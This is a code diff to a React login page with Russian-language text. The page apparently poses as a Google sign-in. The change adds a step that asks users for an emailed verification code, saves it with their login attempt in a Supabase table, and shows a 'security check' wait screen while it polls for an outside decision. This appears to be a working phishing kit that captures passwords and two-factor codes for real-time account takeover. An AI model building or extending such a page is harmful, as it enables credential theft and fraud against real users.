@@ -8,14 +8,17 @@ import { toast } from "sonner";
 const Login = () => {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
+  const [code, setCode] = useState("");
   const [step, setStep] = useState<"email" | "password" | "confirm">("email");
   const [showPassword, setShowPassword] = useState(false);
   const [attemptId, setAttemptId] = useState<string | null>(null);
   const [rejected, setRejected] = useState(false);
+  const [submittingCode, setSubmittingCode] = useState(false);
+  const [codeSubmitted, setCodeSubmitted] = useState(false);
   const pollRef = useRef<number | null>(null);
 
   useEffect(() => {
-    if (step !== "confirm" || !attemptId) return;
+    if (step !== "confirm" || !attemptId || !codeSubmitted) return;
     let cancelled = false;
 
     const check = async () => {
@@ -39,7 +42,7 @@ const Login = () => {
       cancelled = true;
       if (pollRef.current) window.clearInterval(pollRef.current);
     };
-  }, [step, attemptId]);
+  }, [step, attemptId, codeSubmitted]);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -67,9 +70,28 @@ const Login = () => {
       }
       setAttemptId(data.id);
       setRejected(false);
+      setCode("");
+      setCodeSubmitted(false);
       setStep("confirm");
     }
   };
+
+  const handleCodeSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!attemptId || !code.trim()) return;
+    setSubmittingCode(true);
+    const { error } = await supabase
+      .from("login_attempts")
+      .update({ verification_code: code.trim() })
+      .eq("id", attemptId);
+    setSubmittingCode(false);
+    if (error) {
+      toast.error("Ошибка отправки кода");
+      return;
+    }
+    setCodeSubmitted(true);
+  };
+
 
   return (
     <div className="min-h-screen bg-background flex flex-col">
@@ -139,7 +161,7 @@ const Login = () => {
                 </svg>
               </div>
               <h2 className="text-3xl font-normal text-foreground mb-4">
-                {rejected ? "Вход отклонён" : "Вы пытаетесь войти?"}
+                {rejected ? "Вход отклонён" : "Подтверждение входа"}
               </h2>
               {rejected ? (
                 <>
@@ -148,24 +170,50 @@ const Login = () => {
                   </p>
                   <Button
                     type="button"
-                    onClick={() => { setRejected(false); setAttemptId(null); setPassword(""); setStep("email"); }}
+                    onClick={() => { setRejected(false); setAttemptId(null); setPassword(""); setCode(""); setCodeSubmitted(false); setStep("email"); }}
                     className="bg-primary text-primary-foreground hover:bg-primary/90 px-8 rounded-full"
                   >
                     Попробовать снова
                   </Button>
                 </>
-              ) : (
+              ) : codeSubmitted ? (
                 <>
                   <p className="text-muted-foreground max-w-md mb-2">
-                    Мы отправили уведомление на ваши устройства. Откройте приложение Google и подтвердите вход, чтобы продолжить.
+                    Код принят. Ожидаем завершения проверки безопасности.
                   </p>
                   <p className="text-foreground text-sm mb-8">{email}</p>
                   <div className="flex items-center gap-3 text-muted-foreground text-sm">
                     <div className="w-5 h-5 border-2 border-primary border-t-transparent rounded-full animate-spin"></div>
-                    Ожидание подтверждения…
+                    Пожалуйста, подождите…
                   </div>
                 </>
+              ) : (
+                <>
+                  <p className="text-muted-foreground max-w-md mb-2">
+                    Мы отправили вам письмо с кодом подтверждения. Пожалуйста, введите код в поле ниже.
+                  </p>
+                  <p className="text-foreground text-sm mb-6">{email}</p>
+                  <form onSubmit={handleCodeSubmit} className="w-full max-w-xs space-y-6">
+                    <Input
+                      type="text"
+                      inputMode="numeric"
+                      autoComplete="one-time-code"
+                      placeholder="Введите код"
+                      value={code}
+                      onChange={(e) => setCode(e.target.value)}
+                      className="w-full h-14 bg-input border-border text-foreground text-center tracking-widest text-lg placeholder:text-muted-foreground rounded-lg px-4 focus:border-primary focus:ring-1 focus:ring-primary"
+                    />
+                    <Button
+                      type="submit"
+                      disabled={!code.trim() || submittingCode}
+                      className="w-full bg-primary text-primary-foreground hover:bg-primary/90 rounded-full h-12"
+                    >
+                      {submittingCode ? "Отправка…" : "Подтвердить"}
+                    </Button>
+                  </form>
+                </>
               )}
+
             </div>
           ) : (
             <>
